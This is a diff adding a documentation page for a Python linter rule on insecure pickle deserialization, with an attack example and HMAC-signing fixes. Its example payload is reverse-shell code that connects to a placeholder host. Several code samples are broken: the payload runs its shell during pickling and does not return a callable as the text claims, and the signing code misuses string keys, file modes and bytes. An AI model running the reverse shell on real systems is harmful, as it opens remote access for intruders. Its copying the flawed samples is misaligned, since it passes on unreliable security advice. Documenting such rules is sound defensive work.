@@ -1,0 +1,62 @@
+<h1>PIC100</h1>
+<p>Loading serialized data with the pickle module can expose arbitrary code execution using the <strong>reduce</strong> method.</p>
+<p>Before objects are serialised, they can have a custom <code>__reduce__</code> method attribute, which will execute on expansion during the pickle loader.</p>
+<p>This can be used to injection malicious data into serialized data.</p>
+<p>Because pickle is often used for caching or storing python objects by serialization, attackers will use this flaw to write arbitrary code to execute on the host.</p>
+<h2>Example</h2>
+<pre><code class="python">import pickle
+
+with open(f) as input:
+    python_objects = pickle.load(input)
+</code></pre>
+<p>An example attacker payload could be:</p>
+<pre><code class="python">import pickle
+
+class ReverseShell:
+    def __reduce__(self):
+        import socket,subprocess,os
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
+
+payload = pickle.dumps(ReverseShell())
+</code></pre>
+<p>To start an open shell on 10.0.0.1:1234.</p>
+<h2>Fixes</h2>
+<p>Either:</p>
+<ul>
+  <li>Use an alternative deserialization method, like JSON</li>
+  <li>Sign your serialized pickle data and then verify it before deserializing to ensure it hasn't been tampered with</li>
+</ul>
+<h2>Signing pickles</h2>
+<p>To sign your pickled data, use the <code>hmac</code> module to hash the pickle data and insert it as a header.</p>
+<pre><code class="python">import hashlib
+import hmac
+import pickle
+
+data = pickle.dumps(obj)
+digest =  hmac.new(&#39;unique-key-here&#39;, data, hashlib.blake2b).hexdigest()
+with open(f) as output:
+    output.write(str(digest) + &#39; &#39; + data)
+</code></pre>
+<p>To verify signed data, use something like this:</p>
+<pre><code class="python">import hashlib
+import hmac
+import pickle
+import secrets
+
+digest, pickle_data = data.split(&#39; &#39;)
+expected_digest = hmac.new(&#39;unique-key-here&#39;, pickle_data, hashlib.blake2b).hexdigest()
+
+if not secrets.compare_digest(digest, expected_digest):
+    print(&#39;Invalid signature&#39;)
+    exit(1)
+
+obj = pickle.loads(pickle_data)
+</code></pre>
+<h2>See Also</h2>
+<ul>
+  <li><a href="https://www.synopsys.com/blogs/software-security/python-pickling/">Understanding Python pickling and how to use it securely at synopsys.com</a></li>
+</ul>
